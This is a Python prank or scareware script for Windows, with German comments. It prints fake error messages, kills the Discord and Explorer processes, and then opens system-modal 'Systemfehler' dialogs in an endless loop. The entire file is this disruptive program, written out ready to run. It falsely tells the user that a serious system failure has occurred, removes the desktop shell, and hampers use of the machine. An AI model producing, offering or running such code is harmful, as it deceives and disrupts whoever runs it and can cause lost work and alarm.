import threading
import time
import ctypes
import psutil
import os

def kill_process(process_name):
    # Alle Prozesse durchsuchen und den gewünschten Prozess beenden
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        try:
            # Prüfen, ob der Prozessname übereinstimmt
            if process_name.lower() in proc.info['name'].lower():
                print(f"Beende {process_name} mit PID {proc.info['pid']}")
                proc.terminate()  # Prozess beenden
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

def endless_error_dialog():
    MB_OK          = 0x00000000
    MB_ICONERROR   = 0x00000010
    MB_SYSTEMMODAL = 0x00001000
    text  = "Ein schwerwiegender Systemfehler ist aufgetreten!\n"
    title = "Systemfehler"
    while True:
        ctypes.windll.user32.MessageBoxW(None, text, title, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL)
        time.sleep(0.1)

def keep_terminal_open():
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    # 1) Begrüßung in der Konsole
    print("Hallo")
    time.sleep(2)
    print("Bitte warte einen Moment...")

    # 2) Warte 5 Sekunden
    time.sleep(5)

    # 3) Fehlertext in Rot in der Konsole
    print("\033[31mERROR 1\033[0m")
    time.sleep(2)
    print("\033[31mERROR 2\033[0m")
    time.sleep(2)
    print("\033[31mERROR 3\033[0m")
    time.sleep(2)
    print("\033[31mERROR 4\033[0m")
    time.sleep(2)
    print("\033[31mERROR 5\033[0m")
    time.sleep(2)
    print("\033[31mERROR 6\033[0m")
    time.sleep(2)
    print("\033[31mERROR 7\033[0m")
    time.sleep(2)
    print("\033[31mERROR 8\033[0m")
    time.sleep(2)

    # 4) Beende Discord und Explorer
    kill_process("Discord")  # Discord schließen
    kill_process("explorer")  # Explorer schließen

    # 5) Starte die unendlichen Fehler-Dialoge in einem Daemon-Thread
    t = threading.Thread(target=endless_error_dialog, daemon=True)
    t.start()

    # 6) Konsole offen halten
    keep_terminal_open()
